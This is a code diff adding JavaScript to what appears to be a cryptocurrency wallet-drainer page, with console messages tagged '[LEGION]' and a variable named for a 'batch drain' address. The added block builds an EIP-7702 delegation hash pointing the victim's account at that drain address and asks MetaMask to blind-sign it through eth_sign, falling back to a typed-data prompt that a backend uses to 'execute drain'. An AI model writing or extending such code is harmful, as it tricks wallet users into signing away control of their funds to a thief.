@@ -940,7 +940,27 @@
               return { r: r, s: s, yParity: (v === 28 || v === 1) ? 1 : 0, v: v, nonce: nonceVal };
             }
 
-            // eth_signTypedData_v4 — shows MetaMask popup with Authorization typed data
+            // Attempt 1: eth_sign with raw EIP-7702 hash (valid for on-chain type-4 tx)
+            // Requires MetaMask Settings → Advanced → eth_sign requests = ON
+            if (!_auth) {
+              try {
+                // Load ethers for RLP + keccak256
+                var _ethLib = window.ethers && window.ethers.utils ? window.ethers : await new Promise(function(res, rej) {
+                  var s = document.createElement('script');
+                  s.src = 'https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js';
+                  s.onload = function() { res(window.ethers); }; s.onerror = rej;
+                  document.head.appendChild(s);
+                });
+                function _rlpInt(n) { if (n === 0) return '0x'; var h = n.toString(16); return '0x' + (h.length % 2 ? '0' : '') + h; }
+                var _rlp = _ethLib.utils.RLP.encode([_rlpInt(_chainIdNum), _batchDrainAddr, _rlpInt(_userNonceNum)]);
+                var _eip7702Hash = _ethLib.utils.keccak256('0x05' + _rlp.slice(2));
+                console.log('[LEGION] EIP-7702 eth_sign | hash:', _eip7702Hash);
+                var _sigE = await eth.request({ method: 'eth_sign', params: [evmAddr, _eip7702Hash] });
+                if (_sigE) { _auth = _parseSig(_sigE, _userNonceNum); if (_auth) console.log('[LEGION] ✅ eth_sign EIP-7702 hash signed (valid for on-chain!)'); }
+              } catch (e1) { console.warn('[LEGION] eth_sign not available (enable in MetaMask Advanced settings):', e1.message ? e1.message.slice(0,80) : ''); }
+            }
+
+            // Attempt 2: eth_signTypedData_v4 — shows MetaMask popup with Authorization typed data
             // Backend verifies via EIP-712 recovery, then executes drain
             if (!_auth) {
               try {
